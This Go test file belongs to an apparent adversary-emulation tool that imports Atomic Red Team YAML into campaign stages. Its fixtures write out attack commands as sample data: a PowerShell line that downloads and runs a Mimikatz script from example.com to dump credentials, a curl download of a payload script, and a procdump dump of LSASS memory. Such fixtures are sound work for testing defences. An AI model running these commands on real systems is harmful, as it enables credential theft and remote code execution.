// Copyright (c) 2024-2026 ThreatEcho. All rights reserved.
// SPDX-License-Identifier: AGPL-3.0-only
// https://threatecho.com

package campaign

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

// sampleAtomicYAML returns realistic ART content for T1059.001.
const sampleAtomicYAML = `attack_technique: T1059.001
display_name: "Command and Scripting Interpreter: PowerShell"
atomic_tests:
  - name: "Mimikatz"
    auto_generated_guid: "f3132740-55bc-48c4-bcc0-758a459cd027"
    description: "Download Mimikatz and dump credentials"
    supported_platforms:
      - windows
    executor:
      name: powershell
      elevation_required: true
      command: |
        IEX (New-Object Net.WebClient).DownloadString('https://example.com/mimi.ps1')
        Invoke-Mimikatz -DumpCreds
      cleanup_command: |
        Remove-Item .\mimikatz -Force -Recurse
    input_arguments:
      mimikatz_url:
        description: "URL for Mimikatz"
        type: url
        default: "https://example.com/mimi.ps1"
  - name: "Invoke-AtomicTest"
    auto_generated_guid: "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
    description: "Run a basic PowerShell command"
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: |
        Write-Host "Hello from Atomic Red Team"
  - name: "Linux Curl Download"
    auto_generated_guid: "b2c3d4e5-f6a7-8901-bcde-f12345678901"
    description: "Use curl to download a file"
    supported_platforms:
      - linux
      - macos
    executor:
      name: bash
      command: |
        curl -o /tmp/payload.sh https://example.com/payload.sh
        chmod +x /tmp/payload.sh
      cleanup_command: |
        rm -f /tmp/payload.sh
`

func TestParseAtomicTechniqueYAML(t *testing.T) {
	var at AtomicTechnique
	err := yaml.Unmarshal([]byte(sampleAtomicYAML), &at)
	if err != nil {
		t.Fatalf("failed to parse atomic YAML: %v", err)
	}
	if at.TechniqueID != "T1059.001" {
		t.Errorf("technique ID = %q, want T1059.001", at.TechniqueID)
	}
	if at.DisplayName != "Command and Scripting Interpreter: PowerShell" {
		t.Errorf("display name = %q, want PowerShell display name", at.DisplayName)
	}
	if len(at.Tests) != 3 {
		t.Fatalf("got %d tests, want 3", len(at.Tests))
	}
	if at.Tests[0].Name != "Mimikatz" {
		t.Errorf("test[0].Name = %q, want Mimikatz", at.Tests[0].Name)
	}
	if at.Tests[0].GUID != "f3132740-55bc-48c4-bcc0-758a459cd027" {
		t.Errorf("test[0].GUID = %q, want f3132740...", at.Tests[0].GUID)
	}
	if !at.Tests[0].Executor.ElevationReq {
		t.Error("test[0] should require elevation")
	}
	if len(at.Tests[0].InputArguments) != 1 {
		t.Errorf("test[0] has %d input args, want 1", len(at.Tests[0].InputArguments))
	}
}

func TestImportAtomic_SingleTest(t *testing.T) {
	at := &AtomicTechnique{
		TechniqueID: "T1059.001",
		DisplayName: "PowerShell",
		Tests: []AtomicTest{
			{
				Name:               "Basic PowerShell",
				GUID:               "aaa-bbb",
				Description:        "Run a PowerShell command",
				SupportedPlatforms: []string{"windows"},
				Executor: AtomicExecutor{
					Name:    "powershell",
					Command: "Write-Host test",
				},
			},
		},
	}

	c := ImportAtomic(at, ImportOptions{})
	if len(c.Stages) != 1 {
		t.Fatalf("got %d stages, want 1", len(c.Stages))
	}
	s := c.Stages[0]
	if s.ID != "basic-powershell" {
		t.Errorf("stage ID = %q, want basic-powershell", s.ID)
	}
	if s.Technique != "T1059.001" {
		t.Errorf("technique = %q, want T1059.001", s.Technique)
	}
	if s.Tactic != "execution" {
		t.Errorf("tactic = %q, want execution", s.Tactic)
	}
	if s.Execute.Type != "shell" {
		t.Errorf("execute type = %q, want shell", s.Execute.Type)
	}
	if c.Meta.Adversary != "Atomic Red Team" {
		t.Errorf("adversary = %q, want Atomic Red Team", c.Meta.Adversary)
	}
}

func TestImportAtomic_MultipleTests(t *testing.T) {
	var at AtomicTechnique
	if err := yaml.Unmarshal([]byte(sampleAtomicYAML), &at); err != nil {
		t.Fatal(err)
	}

	c := ImportAtomic(&at, ImportOptions{CampaignName: "multi-test"})
	if len(c.Stages) != 3 {
		t.Fatalf("got %d stages, want 3", len(c.Stages))
	}
	// Verify all stage IDs are unique.
	ids := make(map[string]bool)
	for _, s := range c.Stages {
		if ids[s.ID] {
			t.Errorf("duplicate stage ID: %s", s.ID)
		}
		ids[s.ID] = true
	}
}

func TestImportAtomic_PlatformFilter(t *testing.T) {
	var at AtomicTechnique
	if err := yaml.Unmarshal([]byte(sampleAtomicYAML), &at); err != nil {
		t.Fatal(err)
	}

	c := ImportAtomic(&at, ImportOptions{Platforms: []string{"windows"}})
	// The third test is linux/macos only — should be filtered out.
	if len(c.Stages) != 2 {
		t.Fatalf("got %d stages, want 2 (windows-only filter)", len(c.Stages))
	}
	for _, s := range c.Stages {
		hasWindows := false
		for _, p := range s.Platform {
			if p == "windows" {
				hasWindows = true
			}
		}
		if !hasWindows {
			t.Errorf("stage %q should have windows platform", s.ID)
		}
	}
}

func TestImportAtomic_MaxTests(t *testing.T) {
	var at AtomicTechnique
	if err := yaml.Unmarshal([]byte(sampleAtomicYAML), &at); err != nil {
		t.Fatal(err)
	}

	c := ImportAtomic(&at, ImportOptions{MaxTests: 1})
	if len(c.Stages) != 1 {
		t.Fatalf("got %d stages, want 1 (MaxTests=1)", len(c.Stages))
	}
}

func TestImportAtomic_CommandSplitting(t *testing.T) {
	at := &AtomicTechnique{
		TechniqueID: "T1059.001",
		DisplayName: "PowerShell",
		Tests: []AtomicTest{
			{
				Name:               "Multi Line",
				SupportedPlatforms: []string{"windows"},
				Executor: AtomicExecutor{
					Name:    "powershell",
					Command: "line1\nline2\n\nline3\n",
				},
			},
		},
	}

	c := ImportAtomic(at, ImportOptions{})
	cmds := c.Stages[0].Execute.Commands
	if len(cmds) != 3 {
		t.Fatalf("got %d commands, want 3 (empty lines stripped)", len(cmds))
	}
	if cmds[0] != "line1" || cmds[1] != "line2" || cmds[2] != "line3" {
		t.Errorf("commands = %v, want [line1 line2 line3]", cmds)
	}
}

func TestImportAtomic_CleanupCommands(t *testing.T) {
	at := &AtomicTechnique{
		TechniqueID: "T1059.001",
		DisplayName: "PowerShell",
		Tests: []AtomicTest{
			{
				Name:               "With Cleanup",
				SupportedPlatforms: []string{"windows"},
				Executor: AtomicExecutor{
					Name:           "powershell",
					Command:        "echo attack",
					CleanupCommand: "Remove-Item file1\nRemove-Item file2",
				},
			},
		},
	}

	c := ImportAtomic(at, ImportOptions{})
	cleanup := c.Stages[0].Execute.Cleanup
	if len(cleanup) != 2 {
		t.Fatalf("got %d cleanup commands, want 2", len(cleanup))
	}
	if cleanup[0] != "Remove-Item file1" {
		t.Errorf("cleanup[0] = %q", cleanup[0])
	}
}

func TestImportAtomic_ElevatedFlag(t *testing.T) {
	at := &AtomicTechnique{
		TechniqueID: "T1059.001",
		DisplayName: "PowerShell",
		Tests: []AtomicTest{
			{
				Name:               "Elevated Test",
				SupportedPlatforms: []string{"windows"},
				Executor: AtomicExecutor{
					Name:         "powershell",
					Command:      "whoami /priv",
					ElevationReq: true,
				},
			},
			{
				Name:               "Non-Elevated Test",
				SupportedPlatforms: []string{"windows"},
				Executor: AtomicExecutor{
					Name:    "powershell",
					Command: "whoami",
				},
			},
		},
	}

	c := ImportAtomic(at, ImportOptions{})
	if !c.Stages[0].Execute.Elevated {
		t.Error("stage 0 should be elevated")
	}
	if c.Stages[1].Execute.Elevated {
		t.Error("stage 1 should not be elevated")
	}
}

func TestImportAtomic_InputArgumentsToVariables(t *testing.T) {
	at := &AtomicTechnique{
		TechniqueID: "T1059.001",
		DisplayName: "PowerShell",
		Tests: []AtomicTest{
			{
				Name:               "With Args",
				SupportedPlatforms: []string{"windows"},
				Executor: AtomicExecutor{
					Name:    "powershell",
					Command: "echo #{target_url}",
				},
				InputArguments: map[string]AtomicArg{
					"target_url": {
						Description: "Target URL",
						Type:        "url",
						Default:     "https://example.com",
					},
					"output_file": {
						Description: "Output file",
						Type:        "path",
						Default:     "C:\\temp\\out.txt",
					},
				},
			},
		},
	}

	c := ImportAtomic(at, ImportOptions{})
	if c.Variables == nil {
		t.Fatal("variables should not be nil")
	}
	if c.Variables["target_url"] != "https://example.com" {
		t.Errorf("target_url = %q, want https://example.com", c.Variables["target_url"])
	}
	if c.Variables["output_file"] != "C:\\temp\\out.txt" {
		t.Errorf("output_file = %q", c.Variables["output_file"])
	}
}

func TestSanitizeStageID(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"Mimikatz Download", "mimikatz-download"},
		{"Simple Test", "simple-test"},
		{"test!@#with$%^special&*chars", "testwithspecialchars"},
		{"  Leading Trailing  ", "leading-trailing"},
		{"UPPERCASE-Test", "uppercase-test"},
		{"multiple   spaces", "multiple-spaces"},
		{"", "stage"},
		{"a-b-c", "a-b-c"},
		{strings.Repeat("a", 100), strings.Repeat("a", 64)},
	}

	for _, tc := range tests {
		got := sanitizeStageID(tc.input)
		if got != tc.want {
			t.Errorf("sanitizeStageID(%q) = %q, want %q", tc.input, got, tc.want)
		}
	}
}

func TestStageIDUniqueness(t *testing.T) {
	at := &AtomicTechnique{
		TechniqueID: "T1059.001",
		DisplayName: "PowerShell",
		Tests: []AtomicTest{
			{
				Name:               "Duplicate Name",
				SupportedPlatforms: []string{"windows"},
				Executor:           AtomicExecutor{Name: "powershell", Command: "echo 1"},
			},
			{
				Name:               "Duplicate Name",
				SupportedPlatforms: []string{"windows"},
				Executor:           AtomicExecutor{Name: "powershell", Command: "echo 2"},
			},
			{
				Name:               "Duplicate Name",
				SupportedPlatforms: []string{"windows"},
				Executor:           AtomicExecutor{Name: "powershell", Command: "echo 3"},
			},
		},
	}

	c := ImportAtomic(at, ImportOptions{})
	if len(c.Stages) != 3 {
		t.Fatalf("got %d stages, want 3", len(c.Stages))
	}

	ids := make(map[string]bool)
	for _, s := range c.Stages {
		if ids[s.ID] {
			t.Errorf("duplicate stage ID: %s", s.ID)
		}
		ids[s.ID] = true
	}

	// Verify the uniqueness pattern: base, base-2, base-3.
	if c.Stages[0].ID != "duplicate-name" {
		t.Errorf("stage[0] ID = %q, want duplicate-name", c.Stages[0].ID)
	}
	if c.Stages[1].ID != "duplicate-name-2" {
		t.Errorf("stage[1] ID = %q, want duplicate-name-2", c.Stages[1].ID)
	}
	if c.Stages[2].ID != "duplicate-name-3" {
		t.Errorf("stage[2] ID = %q, want duplicate-name-3", c.Stages[2].ID)
	}
}

func TestImportAtomicFile(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "T1059.001.yaml")
	if err := os.WriteFile(path, []byte(sampleAtomicYAML), 0644); err != nil {
		t.Fatal(err)
	}

	c, err := ImportAtomicFile(path, ImportOptions{CampaignName: "file-import"})
	if err != nil {
		t.Fatalf("ImportAtomicFile failed: %v", err)
	}
	if c.Meta.Name != "file-import" {
		t.Errorf("campaign name = %q, want file-import", c.Meta.Name)
	}
	if len(c.Stages) != 3 {
		t.Errorf("got %d stages, want 3", len(c.Stages))
	}
}

func TestImportAtomicDir(t *testing.T) {
	dir := t.TempDir()

	// Write two technique files.
	yaml1 := `attack_technique: T1059.001
display_name: "PowerShell"
atomic_tests:
  - name: "PS Test 1"
    auto_generated_guid: "aaa-111"
    description: "PowerShell test"
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: "Write-Host test1"
`
	yaml2 := `attack_technique: T1003.001
display_name: "LSASS Memory"
atomic_tests:
  - name: "Dump LSASS"
    auto_generated_guid: "bbb-222"
    description: "Dump LSASS memory"
    supported_platforms:
      - windows
    executor:
      name: command_prompt
      elevation_required: true
      command: "procdump -ma lsass.exe lsass.dmp"
`

	if err := os.WriteFile(filepath.Join(dir, "T1059.001.yaml"), []byte(yaml1), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "T1003.001.yaml"), []byte(yaml2), 0644); err != nil {
		t.Fatal(err)
	}

	c, err := ImportAtomicDir(dir, ImportOptions{CampaignName: "dir-import"})
	if err != nil {
		t.Fatalf("ImportAtomicDir failed: %v", err)
	}
	if len(c.Stages) != 2 {
		t.Fatalf("got %d stages, want 2", len(c.Stages))
	}

	// Verify stages come from different techniques.
	techniques := c.UniqueTechniques()
	if len(techniques) != 2 {
		t.Errorf("got %d unique techniques, want 2", len(techniques))
	}

	// Verify stage IDs have technique prefixes (from dir import).
	for _, s := range c.Stages {
		if !strings.HasPrefix(s.ID, "t1") {
			t.Errorf("stage ID %q should start with technique prefix", s.ID)
		}
	}
}

func TestImportAtomic_EmptyTests(t *testing.T) {
	at := &AtomicTechnique{
		TechniqueID: "T1059.001",
		DisplayName: "PowerShell",
		Tests:       []AtomicTest{},
	}

	c := ImportAtomic(at, ImportOptions{})
	if len(c.Stages) != 0 {
		t.Errorf("got %d stages, want 0 for empty tests", len(c.Stages))
	}
}

func TestImportAtomicFile_InvalidYAML(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "bad.yaml")
	if err := os.WriteFile(path, []byte("not: [valid: yaml: {{{"), 0644); err != nil {
		t.Fatal(err)
	}

	_, err := ImportAtomicFile(path, ImportOptions{})
	if err == nil {
		t.Error("expected error for invalid YAML")
	}
}

func TestImportAtomicFile_MissingFile(t *testing.T) {
	_, err := ImportAtomicFile("/nonexistent/path.yaml", ImportOptions{})
	if err == nil {
		t.Error("expected error for missing file")
	}
}

func TestImportAtomicFile_MissingTechniqueID(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "no-technique.yaml")
	content := `display_name: "No Technique"
atomic_tests:
  - name: "Test"
    executor:
      name: bash
      command: "echo hello"
`
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	_, err := ImportAtomicFile(path, ImportOptions{})
	if err == nil {
		t.Error("expected error for missing attack_technique")
	}
}

func TestFormatImportSummary(t *testing.T) {
	var at AtomicTechnique
	if err := yaml.Unmarshal([]byte(sampleAtomicYAML), &at); err != nil {
		t.Fatal(err)
	}

	c := ImportAtomic(&at, ImportOptions{CampaignName: "summary-test"})
	summary := FormatImportSummary(c, "T1059.001.yaml")

	if summary == "" {
		t.Fatal("summary should not be empty")
	}
	if !strings.Contains(summary, "summary-test") {
		t.Error("summary should contain campaign name")
	}
	if !strings.Contains(summary, "T1059.001") {
		t.Error("summary should contain technique ID")
	}
	if !strings.Contains(summary, "Stages:") {
		t.Error("summary should contain stage count")
	}
	if !strings.Contains(summary, "Source:") {
		t.Error("summary should contain source")
	}
}

func TestImportAtomic_GeneratedCampaignPassesValidate(t *testing.T) {
	var at AtomicTechnique
	if err := yaml.Unmarshal([]byte(sampleAtomicYAML), &at); err != nil {
		t.Fatal(err)
	}

	c := ImportAtomic(&at, ImportOptions{CampaignName: "validate-test"})
	errs := Validate(c)
	if len(errs) > 0 {
		t.Errorf("imported campaign should pass validation, got errors:\n  %s",
			strings.Join(errs, "\n  "))
	}
}

func TestImportAtomic_ManualExecutor(t *testing.T) {
	at := &AtomicTechnique{
		TechniqueID: "T1059.001",
		DisplayName: "PowerShell",
		Tests: []AtomicTest{
			{
				Name:               "Manual Test",
				SupportedPlatforms: []string{"windows"},
				Executor: AtomicExecutor{
					Name:    "manual",
					Command: "Open Control Panel and click...",
				},
			},
		},
	}

	c := ImportAtomic(at, ImportOptions{})
	if c.Stages[0].Execute.Type != "manual" {
		t.Errorf("execute type = %q, want manual", c.Stages[0].Execute.Type)
	}
	// Manual executor should have no inferred telemetry.
	if len(c.Stages[0].Expect.Telemetry) != 0 {
		t.Errorf("manual test should have no telemetry, got %v", c.Stages[0].Expect.Telemetry)
	}
}

func TestImportAtomic_TelemetryInference(t *testing.T) {
	tests := []struct {
		executor string
		want     []string
	}{
		{"powershell", []string{"process_create", "script_block"}},
		{"command_prompt", []string{"process_create"}},
		{"bash", []string{"process_create"}},
		{"sh", []string{"process_create"}},
		{"manual", nil},
	}

	for _, tc := range tests {
		at := &AtomicTechnique{
			TechniqueID: "T1059.001",
			DisplayName: "Test",
			Tests: []AtomicTest{
				{
					Name:               "Telemetry Test",
					SupportedPlatforms: []string{"windows"},
					Executor: AtomicExecutor{
						Name:    tc.executor,
						Command: "echo test",
					},
				},
			},
		}

		c := ImportAtomic(at, ImportOptions{})
		got := c.Stages[0].Expect.Telemetry
		if len(got) != len(tc.want) {
			t.Errorf("executor %q: got telemetry %v, want %v", tc.executor, got, tc.want)
			continue
		}
		for i := range got {
			if got[i] != tc.want[i] {
				t.Errorf("executor %q: telemetry[%d] = %q, want %q", tc.executor, i, got[i], tc.want[i])
			}
		}
	}
}

func TestImportAtomic_TacticResolution(t *testing.T) {
	// T1003.001 is in the registry under credential-access.
	at := &AtomicTechnique{
		TechniqueID: "T1003.001",
		DisplayName: "LSASS Memory",
		Tests: []AtomicTest{
			{
				Name:               "LSASS Dump",
				SupportedPlatforms: []string{"windows"},
				Executor: AtomicExecutor{
					Name:    "command_prompt",
					Command: "procdump -ma lsass.exe",
				},
			},
		},
	}

	c := ImportAtomic(at, ImportOptions{})
	if c.Stages[0].Tactic != "credential-access" {
		t.Errorf("tactic = %q, want credential-access", c.Stages[0].Tactic)
	}
}

func TestImportAtomic_CustomAdversary(t *testing.T) {
	at := &AtomicTechnique{
		TechniqueID: "T1059.001",
		DisplayName: "PowerShell",
		Tests: []AtomicTest{
			{
				Name:               "Test",
				SupportedPlatforms: []string{"windows"},
				Executor:           AtomicExecutor{Name: "powershell", Command: "echo test"},
			},
		},
	}

	c := ImportAtomic(at, ImportOptions{Adversary: "FIN6"})
	if c.Meta.Adversary != "FIN6" {
		t.Errorf("adversary = %q, want FIN6", c.Meta.Adversary)
	}
}

func TestImportAtomicDir_EmptyDir(t *testing.T) {
	dir := t.TempDir()
	_, err := ImportAtomicDir(dir, ImportOptions{})
	if err == nil {
		t.Error("expected error for empty directory")
	}
}

func TestImportAtomicDir_WithPlatformFilter(t *testing.T) {
	dir := t.TempDir()

	yaml1 := `attack_technique: T1059.004
display_name: "Unix Shell"
atomic_tests:
  - name: "Linux Shell"
    supported_platforms:
      - linux
    executor:
      name: bash
      command: "echo linux"
  - name: "Windows Shell"
    supported_platforms:
      - windows
    executor:
      name: command_prompt
      command: "echo windows"
`
	if err := os.WriteFile(filepath.Join(dir, "T1059.004.yaml"), []byte(yaml1), 0644); err != nil {
		t.Fatal(err)
	}

	c, err := ImportAtomicDir(dir, ImportOptions{
		CampaignName: "linux-only",
		Platforms:    []string{"linux"},
	})
	if err != nil {
		t.Fatalf("ImportAtomicDir failed: %v", err)
	}
	if len(c.Stages) != 1 {
		t.Fatalf("got %d stages, want 1 (linux only)", len(c.Stages))
	}
	if c.Stages[0].Name != "Linux Shell" {
		t.Errorf("stage name = %q, want Linux Shell", c.Stages[0].Name)
	}
}

func TestImportAtomic_DefaultCampaignName(t *testing.T) {
	at := &AtomicTechnique{
		TechniqueID: "T1059.001",
		DisplayName: "PowerShell",
		Tests: []AtomicTest{
			{
				Name:               "Test",
				SupportedPlatforms: []string{"windows"},
				Executor:           AtomicExecutor{Name: "powershell", Command: "echo test"},
			},
		},
	}

	c := ImportAtomic(at, ImportOptions{})
	if !strings.Contains(c.Meta.Name, "T1059.001") {
		t.Errorf("default campaign name %q should contain technique ID", c.Meta.Name)
	}
	if !strings.Contains(c.Meta.Name, "PowerShell") {
		t.Errorf("default campaign name %q should contain display name", c.Meta.Name)
	}
}

func TestImportAtomic_NoCleanupCommand(t *testing.T) {
	at := &AtomicTechnique{
		TechniqueID: "T1059.001",
		DisplayName: "PowerShell",
		Tests: []AtomicTest{
			{
				Name:               "No Cleanup",
				SupportedPlatforms: []string{"windows"},
				Executor: AtomicExecutor{
					Name:    "powershell",
					Command: "echo no-cleanup",
				},
			},
		},
	}

	c := ImportAtomic(at, ImportOptions{})
	if len(c.Stages[0].Execute.Cleanup) != 0 {
		t.Errorf("expected no cleanup commands, got %v", c.Stages[0].Execute.Cleanup)
	}
}
